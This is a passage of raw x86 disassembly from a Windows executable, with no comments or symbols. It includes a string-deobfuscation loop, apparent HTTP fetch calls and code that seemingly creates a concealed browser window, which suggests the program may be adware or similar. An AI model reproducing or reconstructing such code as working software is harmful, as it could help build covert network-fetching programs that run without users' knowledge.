  409dd6:	66 83 24 78 00       	andw   $0x0,(%eax,%edi,2)
  409ddb:	8b 45 18             	mov    0x18(%ebp),%eax
  409dde:	89 38                	mov    %edi,(%eax)
  409de0:	56                   	push   %esi
  409de1:	6a 00                	push   $0x0
  409de3:	ff d3                	call   *%ebx
  409de5:	50                   	push   %eax
  409de6:	ff 15 a8 e0 40 00    	call   *0x40e0a8
  409dec:	8b 45 fc             	mov    -0x4(%ebp),%eax
  409def:	5e                   	pop    %esi
  409df0:	5b                   	pop    %ebx
  409df1:	5f                   	pop    %edi
  409df2:	c9                   	leave
  409df3:	c3                   	ret
  409df4:	55                   	push   %ebp
  409df5:	8b ec                	mov    %esp,%ebp
  409df7:	b8 10 12 00 00       	mov    $0x1210,%eax
  409dfc:	e8 af 37 00 00       	call   0x40d5b0
  409e01:	53                   	push   %ebx
  409e02:	56                   	push   %esi
  409e03:	8d 85 f0 fd ff ff    	lea    -0x210(%ebp),%eax
  409e09:	57                   	push   %edi
  409e0a:	83 c2 0e             	add    $0xe,%edx
  409e0d:	50                   	push   %eax
  409e0e:	e8 fe b6 ff ff       	call   0x405511
  409e13:	8d 85 f0 fd ff ff    	lea    -0x210(%ebp),%eax
  409e19:	50                   	push   %eax
  409e1a:	e8 32 b6 ff ff       	call   0x405451
  409e1f:	33 db                	xor    %ebx,%ebx
  409e21:	68 c8 3e 42 00       	push   $0x423ec8
  409e26:	66 89 9c 45 ee fd ff 	mov    %bx,-0x212(%ebp,%eax,2)
  409e2d:	ff 
  409e2e:	e8 1e b6 ff ff       	call   0x405451
  409e33:	83 c4 0c             	add    $0xc,%esp
  409e36:	89 45 f8             	mov    %eax,-0x8(%ebp)
  409e39:	e8 ac 20 00 00       	call   0x40beea
  409e3e:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  409e41:	8b f0                	mov    %eax,%esi
  409e43:	89 75 f4             	mov    %esi,-0xc(%ebp)
  409e46:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  409e49:	76 43                	jbe    0x409e8e
  409e4b:	66 0f be 06          	movsbw (%esi),%ax
  409e4f:	66 2d 02 00          	sub    $0x2,%ax
  409e53:	0f b7 c8             	movzwl %ax,%ecx
  409e56:	8b 45 fc             	mov    -0x4(%ebp),%eax
  409e59:	6a 03                	push   $0x3
  409e5b:	33 d2                	xor    %edx,%edx
  409e5d:	5f                   	pop    %edi
  409e5e:	f7 f7                	div    %edi
  409e60:	2b d3                	sub    %ebx,%edx
  409e62:	74 16                	je     0x409e7a
  409e64:	4a                   	dec    %edx
  409e65:	74 0b                	je     0x409e72
  409e67:	4a                   	dec    %edx
  409e68:	75 16                	jne    0x409e80
  409e6a:	81 c1 fe ff 00 00    	add    $0xfffe,%ecx
  409e70:	eb 0e                	jmp    0x409e80
  409e72:	81 c1 fb ff 00 00    	add    $0xfffb,%ecx
  409e78:	eb 06                	jmp    0x409e80
  409e7a:	81 c1 ff ff 00 00    	add    $0xffff,%ecx
  409e80:	88 0e                	mov    %cl,(%esi)
  409e82:	46                   	inc    %esi
  409e83:	ff 45 fc             	incl   -0x4(%ebp)
  409e86:	8b 45 fc             	mov    -0x4(%ebp),%eax
  409e89:	3b 45 f8             	cmp    -0x8(%ebp),%eax
  409e8c:	72 bd                	jb     0x409e4b
  409e8e:	53                   	push   %ebx
  409e8f:	53                   	push   %ebx
  409e90:	6a 03                	push   $0x3
  409e92:	53                   	push   %ebx
  409e93:	53                   	push   %ebx
  409e94:	6a 50                	push   $0x50
  409e96:	8d 85 f0 fd ff ff    	lea    -0x210(%ebp),%eax
  409e9c:	50                   	push   %eax
  409e9d:	ff 35 e4 14 41 00    	push   0x4114e4
  409ea3:	ff 15 74 e1 40 00    	call   *0x40e174
  409ea9:	3b c3                	cmp    %ebx,%eax
  409eab:	75 04                	jne    0x409eb1
  409ead:	33 c0                	xor    %eax,%eax
  409eaf:	eb 75                	jmp    0x409f26
  409eb1:	53                   	push   %ebx
  409eb2:	68 00 01 40 04       	push   $0x4400100
  409eb7:	53                   	push   %ebx
  409eb8:	53                   	push   %ebx
  409eb9:	53                   	push   %ebx
  409eba:	ff 75 08             	push   0x8(%ebp)
  409ebd:	68 a0 f0 40 00       	push   $0x40f0a0
  409ec2:	50                   	push   %eax
  409ec3:	ff 15 78 e1 40 00    	call   *0x40e178
  409ec9:	8b f0                	mov    %eax,%esi
  409ecb:	3b f3                	cmp    %ebx,%esi
  409ecd:	74 de                	je     0x409ead
  409ecf:	ff 75 f8             	push   -0x8(%ebp)
  409ed2:	ff 75 f4             	push   -0xc(%ebp)
  409ed5:	53                   	push   %ebx
  409ed6:	ff 75 0c             	push   0xc(%ebp)
  409ed9:	56                   	push   %esi
  409eda:	ff 15 70 e1 40 00    	call   *0x40e170
  409ee0:	ff 75 f4             	push   -0xc(%ebp)
  409ee3:	8b f8                	mov    %eax,%edi
  409ee5:	e8 50 1f 00 00       	call   0x40be3a
  409eea:	3b fb                	cmp    %ebx,%edi
  409eec:	59                   	pop    %ecx
  409eed:	74 be                	je     0x409ead
  409eef:	8d 45 f0             	lea    -0x10(%ebp),%eax
  409ef2:	50                   	push   %eax
  409ef3:	68 00 10 00 00       	push   $0x1000
  409ef8:	8d 85 f0 ed ff ff    	lea    -0x1210(%ebp),%eax
  409efe:	50                   	push   %eax
  409eff:	56                   	push   %esi
  409f00:	ff 15 8c e1 40 00    	call   *0x40e18c
  409f06:	8b f0                	mov    %eax,%esi
  409f08:	3b f3                	cmp    %ebx,%esi
  409f0a:	74 18                	je     0x409f24
  409f0c:	8b 45 f0             	mov    -0x10(%ebp),%eax
  409f0f:	88 9c 05 f0 ed ff ff 	mov    %bl,-0x1210(%ebp,%eax,1)
  409f16:	8b 5d 10             	mov    0x10(%ebp),%ebx
  409f19:	8d 8d f0 ed ff ff    	lea    -0x1210(%ebp),%ecx
  409f1f:	e8 11 20 00 00       	call   0x40bf35
  409f24:	8b c6                	mov    %esi,%eax
  409f26:	5f                   	pop    %edi
  409f27:	5e                   	pop    %esi
  409f28:	5b                   	pop    %ebx
  409f29:	c9                   	leave
  409f2a:	c3                   	ret
  409f2b:	6a 24                	push   $0x24
  409f2d:	68 50 f7 40 00       	push   $0x40f750
  409f32:	e8 21 33 00 00       	call   0x40d258
  409f37:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  409f3b:	e8 0d b9 ff ff       	call   0x40584d
  409f40:	0f b6 c9             	movzbl %cl,%ecx
  409f43:	41                   	inc    %ecx
  409f44:	99                   	cltd
  409f45:	f7 f9                	idiv   %ecx
  409f47:	8b f2                	mov    %edx,%esi
  409f49:	0f b6 45 08          	movzbl 0x8(%ebp),%eax
  409f4d:	03 f0                	add    %eax,%esi
  409f4f:	69 f6 e8 03 00 00    	imul   $0x3e8,%esi,%esi
  409f55:	8b 3d 50 e0 40 00    	mov    0x40e050,%edi
  409f5b:	ff d7                	call   *%edi
  409f5d:	8b d8                	mov    %eax,%ebx
  409f5f:	ff d7                	call   *%edi
  409f61:	2b c3                	sub    %ebx,%eax
  409f63:	3b c6                	cmp    %esi,%eax
  409f65:	73 40                	jae    0x409fa7
  409f67:	6a 01                	push   $0x1
  409f69:	33 c0                	xor    %eax,%eax
  409f6b:	50                   	push   %eax
  409f6c:	50                   	push   %eax
  409f6d:	50                   	push   %eax
  409f6e:	8d 45 cc             	lea    -0x34(%ebp),%eax
  409f71:	50                   	push   %eax
  409f72:	ff 15 50 e1 40 00    	call   *0x40e150
  409f78:	85 c0                	test   %eax,%eax
  409f7a:	74 0c                	je     0x409f88
  409f7c:	8d 45 cc             	lea    -0x34(%ebp),%eax
  409f7f:	50                   	push   %eax
  409f80:	ff 15 3c e1 40 00    	call   *0x40e13c
  409f86:	eb df                	jmp    0x409f67
  409f88:	68 2c 01 00 00       	push   $0x12c
  409f8d:	ff 15 70 e0 40 00    	call   *0x40e070
  409f93:	eb ca                	jmp    0x409f5f
  409f95:	33 c0                	xor    %eax,%eax
  409f97:	40                   	inc    %eax
  409f98:	c3                   	ret
  409f99:	8b 65 e8             	mov    -0x18(%ebp),%esp
  409f9c:	68 f4 01 00 00       	push   $0x1f4
  409fa1:	ff 15 70 e0 40 00    	call   *0x40e070
  409fa7:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  409fab:	e8 e3 32 00 00       	call   0x40d293
  409fb0:	c3                   	ret
  409fb1:	6a 2c                	push   $0x2c
  409fb3:	68 40 f7 40 00       	push   $0x40f740
  409fb8:	e8 9b 32 00 00       	call   0x40d258
  409fbd:	33 db                	xor    %ebx,%ebx
  409fbf:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  409fc2:	83 4d e4 ff          	orl    $0xffffffff,-0x1c(%ebp)
  409fc6:	33 ff                	xor    %edi,%edi
  409fc8:	8b 35 50 e0 40 00    	mov    0x40e050,%esi
  409fce:	ff d6                	call   *%esi
  409fd0:	89 45 e0             	mov    %eax,-0x20(%ebp)
  409fd3:	3b fb                	cmp    %ebx,%edi
  409fd5:	7c 59                	jl     0x40a030
  409fd7:	66 83 7d e4 ff       	cmpw   $0xffff,-0x1c(%ebp)
  409fdc:	75 52                	jne    0x40a030
  409fde:	ff d6                	call   *%esi
  409fe0:	2b 45 e0             	sub    -0x20(%ebp),%eax
  409fe3:	3d 90 5f 01 00       	cmp    $0x15f90,%eax
  409fe8:	77 61                	ja     0x40a04b
  409fea:	6a 64                	push   $0x64
  409fec:	ff 15 70 e0 40 00    	call   *0x40e070
  409ff2:	6a 01                	push   $0x1
  409ff4:	53                   	push   %ebx
  409ff5:	53                   	push   %ebx
  409ff6:	53                   	push   %ebx
  409ff7:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  409ffa:	50                   	push   %eax
  409ffb:	ff 15 50 e1 40 00    	call   *0x40e150
  40a001:	85 c0                	test   %eax,%eax
  40a003:	74 0c                	je     0x40a011
  40a005:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  40a008:	50                   	push   %eax
  40a009:	ff 15 3c e1 40 00    	call   *0x40e13c
  40a00f:	eb e1                	jmp    0x409ff2
  40a011:	0f b6 45 08          	movzbl 0x8(%ebp),%eax
  40a015:	6b c0 14             	imul   $0x14,%eax,%eax
  40a018:	8b 80 d0 7e 42 00    	mov    0x427ed0(%eax),%eax
  40a01e:	8b 08                	mov    (%eax),%ecx
  40a020:	8d 55 e4             	lea    -0x1c(%ebp),%edx
  40a023:	52                   	push   %edx
  40a024:	50                   	push   %eax
  40a025:	ff 51 7c             	call   *0x7c(%ecx)
  40a028:	8b f8                	mov    %eax,%edi
  40a02a:	3b fb                	cmp    %ebx,%edi
  40a02c:	7c 1d                	jl     0x40a04b
  40a02e:	eb a3                	jmp    0x409fd3
  40a030:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  40a034:	33 c0                	xor    %eax,%eax
  40a036:	40                   	inc    %eax
  40a037:	eb 18                	jmp    0x40a051
  40a039:	33 c0                	xor    %eax,%eax
  40a03b:	40                   	inc    %eax
  40a03c:	c3                   	ret
  40a03d:	8b 65 e8             	mov    -0x18(%ebp),%esp
  40a040:	68 f4 01 00 00       	push   $0x1f4
  40a045:	ff 15 70 e0 40 00    	call   *0x40e070
  40a04b:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  40a04f:	33 c0                	xor    %eax,%eax
  40a051:	e8 3d 32 00 00       	call   0x40d293
  40a056:	c3                   	ret
  40a057:	55                   	push   %ebp
  40a058:	8b ec                	mov    %esp,%ebp
  40a05a:	51                   	push   %ecx
  40a05b:	51                   	push   %ecx
  40a05c:	53                   	push   %ebx
  40a05d:	57                   	push   %edi
  40a05e:	33 ff                	xor    %edi,%edi
  40a060:	89 7d fc             	mov    %edi,-0x4(%ebp)
  40a063:	89 3e                	mov    %edi,(%esi)
  40a065:	ff 15 40 e1 40 00    	call   *0x40e140
  40a06b:	8b d8                	mov    %eax,%ebx
  40a06d:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40a070:	50                   	push   %eax
  40a071:	68 38 e2 40 00       	push   $0x40e238
  40a076:	6a 15                	push   $0x15
  40a078:	57                   	push   %edi
  40a079:	68 18 e2 40 00       	push   $0x40e218
  40a07e:	ff 15 a4 e1 40 00    	call   *0x40e1a4
  40a084:	53                   	push   %ebx
  40a085:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40a088:	ff 15 54 e1 40 00    	call   *0x40e154
  40a08e:	39 7d f8             	cmp    %edi,-0x8(%ebp)
  40a091:	7c 17                	jl     0x40a0aa
  40a093:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40a096:	8b 08                	mov    (%eax),%ecx
  40a098:	56                   	push   %esi
  40a099:	68 28 e2 40 00       	push   $0x40e228
  40a09e:	50                   	push   %eax
  40a09f:	ff 11                	call   *(%ecx)
  40a0a1:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40a0a4:	8b 08                	mov    (%eax),%ecx
  40a0a6:	50                   	push   %eax
  40a0a7:	ff 51 08             	call   *0x8(%ecx)
  40a0aa:	33 c0                	xor    %eax,%eax
  40a0ac:	39 3e                	cmp    %edi,(%esi)
  40a0ae:	5f                   	pop    %edi
  40a0af:	0f 95 c0             	setne  %al
  40a0b2:	5b                   	pop    %ebx
  40a0b3:	c9                   	leave
  40a0b4:	c3                   	ret
  40a0b5:	55                   	push   %ebp
  40a0b6:	8b ec                	mov    %esp,%ebp
  40a0b8:	51                   	push   %ecx
  40a0b9:	56                   	push   %esi
  40a0ba:	57                   	push   %edi
  40a0bb:	33 ff                	xor    %edi,%edi
  40a0bd:	57                   	push   %edi
  40a0be:	8b f0                	mov    %eax,%esi
  40a0c0:	ff 15 ac e1 40 00    	call   *0x40e1ac
  40a0c6:	ff 15 00 32 41 00    	call   *0x413200
  40a0cc:	57                   	push   %edi
  40a0cd:	57                   	push   %edi
  40a0ce:	ff 15 f4 e0 40 00    	call   *0x40e0f4
  40a0d4:	50                   	push   %eax
  40a0d5:	57                   	push   %edi
  40a0d6:	57                   	push   %edi
  40a0d7:	68 20 03 00 00       	push   $0x320
  40a0dc:	68 b0 04 00 00       	push   $0x4b0
  40a0e1:	57                   	push   %edi
  40a0e2:	57                   	push   %edi
  40a0e3:	68 00 00 00 80       	push   $0x80000000
  40a0e8:	68 ac f0 40 00       	push   $0x40f0ac
  40a0ed:	68 cc f0 40 00       	push   $0x40f0cc
  40a0f2:	57                   	push   %edi
  40a0f3:	ff 15 48 e1 40 00    	call   *0x40e148
  40a0f9:	3b c7                	cmp    %edi,%eax
  40a0fb:	74 53                	je     0x40a150
  40a0fd:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  40a100:	51                   	push   %ecx
  40a101:	50                   	push   %eax
  40a102:	89 3e                	mov    %edi,(%esi)
  40a104:	ff 15 50 21 41 00    	call   *0x412150
  40a10a:	85 c0                	test   %eax,%eax
  40a10c:	7c 42                	jl     0x40a150
  40a10e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40a111:	3b c7                	cmp    %edi,%eax
  40a113:	74 3b                	je     0x40a150
  40a115:	8b 08                	mov    (%eax),%ecx
  40a117:	53                   	push   %ebx
  40a118:	56                   	push   %esi
  40a119:	68 28 e2 40 00       	push   $0x40e228
  40a11e:	50                   	push   %eax
  40a11f:	ff 11                	call   *(%ecx)
  40a121:	8b d8                	mov    %eax,%ebx
  40a123:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40a126:	8b 08                	mov    (%eax),%ecx
  40a128:	50                   	push   %eax
  40a129:	ff 51 08             	call   *0x8(%ecx)
  40a12c:	3b df                	cmp    %edi,%ebx
  40a12e:	5b                   	pop    %ebx
  40a12f:	7c 1f                	jl     0x40a150
  40a131:	8b 06                	mov    (%esi),%eax
  40a133:	8b 08                	mov    (%eax),%ecx
  40a135:	6a ff                	push   $0xffffffff
  40a137:	50                   	push   %eax
  40a138:	ff 91 a4 00 00 00    	call   *0xa4(%ecx)
  40a13e:	8b 36                	mov    (%esi),%esi
  40a140:	8b 06                	mov    (%esi),%eax
  40a142:	6a ff                	push   $0xffffffff
  40a144:	56                   	push   %esi
  40a145:	ff 90 f0 00 00 00    	call   *0xf0(%eax)
  40a14b:	33 c0                	xor    %eax,%eax
  40a14d:	40                   	inc    %eax
  40a14e:	eb 02                	jmp    0x40a152
  40a150:	33 c0                	xor    %eax,%eax
  40a152:	5f                   	pop    %edi
  40a153:	5e                   	pop    %esi
  40a154:	c9                   	leave
  40a155:	c3                   	ret
  40a156:	55                   	push   %ebp
  40a157:	8b ec                	mov    %esp,%ebp
  40a159:	83 ec 18             	sub    $0x18,%esp
  40a15c:	83 3d a4 10 41 00 00 	cmpl   $0x0,0x4110a4
  40a163:	53                   	push   %ebx
  40a164:	56                   	push   %esi
  40a165:	57                   	push   %edi
  40a166:	8b d8                	mov    %eax,%ebx
  40a168:	75 0c                	jne    0x40a176
  40a16a:	e8 46 ff ff ff       	call   0x40a0b5
  40a16f:	85 c0                	test   %eax,%eax
  40a171:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40a174:	75 12                	jne    0x40a188
  40a176:	8b f3                	mov    %ebx,%esi
  40a178:	e8 da fe ff ff       	call   0x40a057
  40a17d:	85 c0                	test   %eax,%eax
  40a17f:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40a182:	0f 84 b5 00 00 00    	je     0x40a23d
  40a188:	68 e0 f0 40 00       	push   $0x40f0e0
  40a18d:	ff 15 08 e1 40 00    	call   *0x40e108
  40a193:	8b 0b                	mov    (%ebx),%ecx
  40a195:	8b 11                	mov    (%ecx),%edx
  40a197:	83 ec 10             	sub    $0x10,%esp
  40a19a:	8b fc                	mov    %esp,%edi
  40a19c:	66 c7 45 e8 03 00    	movw   $0x3,-0x18(%ebp)
  40a1a2:	c7 45 f0 01 00 00 00 	movl   $0x1,-0x10(%ebp)
  40a1a9:	8d 75 e8             	lea    -0x18(%ebp),%esi
  40a1ac:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40a1ad:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40a1ae:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40a1af:	50                   	push   %eax
  40a1b0:	51                   	push   %ecx
  40a1b1:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40a1b2:	ff 92 88 00 00 00    	call   *0x88(%edx)
  40a1b8:	8b 03                	mov    (%ebx),%eax
  40a1ba:	8b 08                	mov    (%eax),%ecx
  40a1bc:	8d 55 fc             	lea    -0x4(%ebp),%edx
  40a1bf:	52                   	push   %edx
  40a1c0:	50                   	push   %eax
  40a1c1:	ff 91 94 00 00 00    	call   *0x94(%ecx)
  40a1c7:	33 f6                	xor    %esi,%esi
  40a1c9:	39 75 fc             	cmp    %esi,-0x4(%ebp)
  40a1cc:	74 56                	je     0x40a224
  40a1ce:	56                   	push   %esi
  40a1cf:	68 f4 f0 40 00       	push   $0x40f0f4
  40a1d4:	ff 15 4c e1 40 00    	call   *0x40e14c
  40a1da:	3b c6                	cmp    %esi,%eax
  40a1dc:	74 0a                	je     0x40a1e8
  40a1de:	50                   	push   %eax
  40a1df:	ff 75 fc             	push   -0x4(%ebp)
  40a1e2:	ff 15 68 e1 40 00    	call   *0x40e168
  40a1e8:	6a ec                	push   $0xffffffec
  40a1ea:	ff 75 fc             	push   -0x4(%ebp)
  40a1ed:	ff 15 38 e1 40 00    	call   *0x40e138
  40a1f3:	0d 80 00 00 00       	or     $0x80,%eax
  40a1f8:	50                   	push   %eax
  40a1f9:	6a ec                	push   $0xffffffec
  40a1fb:	ff 75 fc             	push   -0x4(%ebp)
  40a1fe:	ff 15 64 e1 40 00    	call   *0x40e164
  40a204:	6a 10                	push   $0x10
  40a206:	ff 35 78 52 41 00    	push   0x415278
  40a20c:	b8 88 13 00 00       	mov    $0x1388,%eax
  40a211:	ff 35 b0 fd 41 00    	push   0x41fdb0
  40a217:	50                   	push   %eax
  40a218:	50                   	push   %eax
  40a219:	6a 01                	push   $0x1
  40a21b:	ff 75 fc             	push   -0x4(%ebp)
  40a21e:	ff 15 60 e1 40 00    	call   *0x40e160
  40a224:	8b 03                	mov    (%ebx),%eax
  40a226:	8b 08                	mov    (%eax),%ecx
  40a228:	6a ff                	push   $0xffffffff
  40a22a:	50                   	push   %eax
  40a22b:	ff 91 a4 00 00 00    	call   *0xa4(%ecx)
  40a231:	8b 1b                	mov    (%ebx),%ebx
  40a233:	8b 03                	mov    (%ebx),%eax
  40a235:	56                   	push   %esi
  40a236:	53                   	push   %ebx
  40a237:	ff 90 f0 00 00 00    	call   *0xf0(%eax)
  40a23d:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40a240:	5f                   	pop    %edi
  40a241:	5e                   	pop    %esi
  40a242:	5b                   	pop    %ebx
  40a243:	c9                   	leave
  40a244:	c3                   	ret
  40a245:	55                   	push   %ebp
  40a246:	8b ec                	mov    %esp,%ebp
  40a248:	83 ec 44             	sub    $0x44,%esp
  40a24b:	57                   	push   %edi
  40a24c:	0f b6 7d 10          	movzbl 0x10(%ebp),%edi
  40a250:	6b ff 14             	imul   $0x14,%edi,%edi
  40a253:	33 c0                	xor    %eax,%eax
  40a255:	8d bf d0 7e 42 00    	lea    0x427ed0(%edi),%edi
  40a25b:	39 07                	cmp    %eax,(%edi)
  40a25d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40a260:	74 74                	je     0x40a2d6
  40a262:	53                   	push   %ebx
  40a263:	56                   	push   %esi
  40a264:	6a 40                	push   $0x40
  40a266:	50                   	push   %eax
  40a267:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40a26a:	50                   	push   %eax
  40a26b:	e8 c0 32 00 00       	call   0x40d530
  40a270:	8b 35 08 e1 40 00    	mov    0x40e108,%esi
  40a276:	83 c4 0c             	add    $0xc,%esp
  40a279:	ff 75 0c             	push   0xc(%ebp)
  40a27c:	33 db                	xor    %ebx,%ebx
  40a27e:	43                   	inc    %ebx
  40a27f:	66 c7 45 cc 03 00    	movw   $0x3,-0x34(%ebp)
  40a285:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
  40a288:	66 c7 45 ec 08 00    	movw   $0x8,-0x14(%ebp)
  40a28e:	ff d6                	call   *%esi
  40a290:	ff 75 08             	push   0x8(%ebp)
  40a293:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40a296:	ff d6                	call   *%esi
  40a298:	8b 3f                	mov    (%edi),%edi
  40a29a:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40a29d:	51                   	push   %ecx
  40a29e:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40a2a1:	51                   	push   %ecx
  40a2a2:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  40a2a5:	51                   	push   %ecx
  40a2a6:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40a2a9:	8b f0                	mov    %eax,%esi
  40a2ab:	8b 07                	mov    (%edi),%eax
  40a2ad:	51                   	push   %ecx
  40a2ae:	56                   	push   %esi
  40a2af:	57                   	push   %edi
  40a2b0:	ff 50 2c             	call   *0x2c(%eax)
  40a2b3:	85 c0                	test   %eax,%eax
  40a2b5:	7c 0c                	jl     0x40a2c3
  40a2b7:	ff 75 10             	push   0x10(%ebp)
  40a2ba:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  40a2bd:	e8 ef fc ff ff       	call   0x409fb1
  40a2c2:	59                   	pop    %ecx
  40a2c3:	56                   	push   %esi
  40a2c4:	8b 35 00 e1 40 00    	mov    0x40e100,%esi
  40a2ca:	ff d6                	call   *%esi
  40a2cc:	ff 75 f4             	push   -0xc(%ebp)
  40a2cf:	ff d6                	call   *%esi
  40a2d1:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40a2d4:	5e                   	pop    %esi
  40a2d5:	5b                   	pop    %ebx
  40a2d6:	5f                   	pop    %edi
  40a2d7:	c9                   	leave
  40a2d8:	c3                   	ret
  40a2d9:	55                   	push   %ebp
  40a2da:	8b ec                	mov    %esp,%ebp
  40a2dc:	51                   	push   %ecx
  40a2dd:	56                   	push   %esi
  40a2de:	0f b6 75 10          	movzbl 0x10(%ebp),%esi
  40a2e2:	6b f6 14             	imul   $0x14,%esi,%esi
  40a2e5:	57                   	push   %edi
  40a2e6:	33 ff                	xor    %edi,%edi
  40a2e8:	39 be d4 7e 42 00    	cmp    %edi,0x427ed4(%esi)
  40a2ee:	75 04                	jne    0x40a2f4
  40a2f0:	33 c0                	xor    %eax,%eax
  40a2f2:	eb 4d                	jmp    0x40a341
  40a2f4:	8b 86 e0 7e 42 00    	mov    0x427ee0(%esi),%eax
  40a2fa:	3b c7                	cmp    %edi,%eax
  40a2fc:	74 15                	je     0x40a313
  40a2fe:	50                   	push   %eax
  40a2ff:	57                   	push   %edi
  40a300:	ff 15 d0 e0 40 00    	call   *0x40e0d0
  40a306:	50                   	push   %eax
  40a307:	ff 15 a8 e0 40 00    	call   *0x40e0a8
  40a30d:	89 be e0 7e 42 00    	mov    %edi,0x427ee0(%esi)
  40a313:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40a316:	50                   	push   %eax
  40a317:	8d 45 10             	lea    0x10(%ebp),%eax
  40a31a:	50                   	push   %eax
  40a31b:	ff b6 d4 7e 42 00    	push   0x427ed4(%esi)
  40a321:	ff 75 0c             	push   0xc(%ebp)
  40a324:	ff 75 08             	push   0x8(%ebp)
  40a327:	e8 6d f9 ff ff       	call   0x409c99
  40a32c:	83 c4 14             	add    $0x14,%esp
  40a32f:	85 c0                	test   %eax,%eax
  40a331:	74 0c                	je     0x40a33f
  40a333:	8b 45 10             	mov    0x10(%ebp),%eax
  40a336:	33 ff                	xor    %edi,%edi
  40a338:	89 86 e0 7e 42 00    	mov    %eax,0x427ee0(%esi)
  40a33e:	47                   	inc    %edi
  40a33f:	8b c7                	mov    %edi,%eax
  40a341:	5f                   	pop    %edi
  40a342:	5e                   	pop    %esi
  40a343:	c9                   	leave
  40a344:	c3                   	ret
  40a345:	55                   	push   %ebp
  40a346:	8b ec                	mov    %esp,%ebp
  40a348:	b8 00 40 00 00       	mov    $0x4000,%eax
  40a34d:	e8 5e 32 00 00       	call   0x40d5b0
  40a352:	53                   	push   %ebx
  40a353:	57                   	push   %edi
  40a354:	8b f9                	mov    %ecx,%edi
  40a356:	33 db                	xor    %ebx,%ebx
  40a358:	3b fb                	cmp    %ebx,%edi
  40a35a:	75 0d                	jne    0x40a369
  40a35c:	0f b6 45 14          	movzbl 0x14(%ebp),%eax
  40a360:	6b c0 14             	imul   $0x14,%eax,%eax
  40a363:	8b b8 d8 7e 42 00    	mov    0x427ed8(%eax),%edi
  40a369:	0f b6 45 14          	movzbl 0x14(%ebp),%eax
  40a36d:	6b c0 14             	imul   $0x14,%eax,%eax
  40a370:	85 b8 dc 7e 42 00    	test   %edi,0x427edc(%eax)
  40a376:	75 07                	jne    0x40a37f
  40a378:	33 c0                	xor    %eax,%eax
  40a37a:	e9 e6 00 00 00       	jmp    0x40a465
  40a37f:	83 ff 02             	cmp    $0x2,%edi
  40a382:	66 89 9d 00 c0 ff ff 	mov    %bx,-0x4000(%ebp)
  40a389:	75 10                	jne    0x40a39b
  40a38b:	b9 10 f1 40 00       	mov    $0x40f110,%ecx
  40a390:	8d 85 00 c0 ff ff    	lea    -0x4000(%ebp),%eax
  40a396:	e8 52 b1 ff ff       	call   0x4054ed
  40a39b:	8b 55 0c             	mov    0xc(%ebp),%edx
  40a39e:	85 d2                	test   %edx,%edx
  40a3a0:	56                   	push   %esi
  40a3a1:	be 84 e3 40 00       	mov    $0x40e384,%esi
  40a3a6:	74 2d                	je     0x40a3d5
  40a3a8:	b8 64 e2 40 00       	mov    $0x40e264,%eax
  40a3ad:	e8 b5 b0 ff ff       	call   0x405467
  40a3b2:	85 c0                	test   %eax,%eax
  40a3b4:	74 1f                	je     0x40a3d5
  40a3b6:	b9 2c f1 40 00       	mov    $0x40f12c,%ecx
  40a3bb:	8d 85 00 c0 ff ff    	lea    -0x4000(%ebp),%eax
  40a3c1:	e8 27 b1 ff ff       	call   0x4054ed
  40a3c6:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40a3c9:	e8 1f b1 ff ff       	call   0x4054ed
  40a3ce:	8b ce                	mov    %esi,%ecx
  40a3d0:	e8 18 b1 ff ff       	call   0x4054ed
  40a3d5:	83 ff 02             	cmp    $0x2,%edi
  40a3d8:	75 1a                	jne    0x40a3f4
  40a3da:	b9 40 f1 40 00       	mov    $0x40f140,%ecx
  40a3df:	8d 85 00 c0 ff ff    	lea    -0x4000(%ebp),%eax
  40a3e5:	e8 03 b1 ff ff       	call   0x4054ed
  40a3ea:	b9 78 f1 40 00       	mov    $0x40f178,%ecx
  40a3ef:	e8 f9 b0 ff ff       	call   0x4054ed
  40a3f4:	39 5d 10             	cmp    %ebx,0x10(%ebp)
  40a3f7:	74 1f                	je     0x40a418
  40a3f9:	b9 bc f1 40 00       	mov    $0x40f1bc,%ecx
  40a3fe:	8d 85 00 c0 ff ff    	lea    -0x4000(%ebp),%eax
  40a404:	e8 e4 b0 ff ff       	call   0x4054ed
  40a409:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40a40c:	e8 dc b0 ff ff       	call   0x4054ed
  40a411:	8b ce                	mov    %esi,%ecx
  40a413:	e8 d5 b0 ff ff       	call   0x4054ed
  40a418:	8b 4d 18             	mov    0x18(%ebp),%ecx
  40a41b:	85 c9                	test   %ecx,%ecx
  40a41d:	5e                   	pop    %esi
  40a41e:	74 0b                	je     0x40a42b
  40a420:	8d 85 00 c0 ff ff    	lea    -0x4000(%ebp),%eax
  40a426:	e8 c2 b0 ff ff       	call   0x4054ed
  40a42b:	83 ff 01             	cmp    $0x1,%edi
  40a42e:	75 17                	jne    0x40a447
  40a430:	ff 75 14             	push   0x14(%ebp)
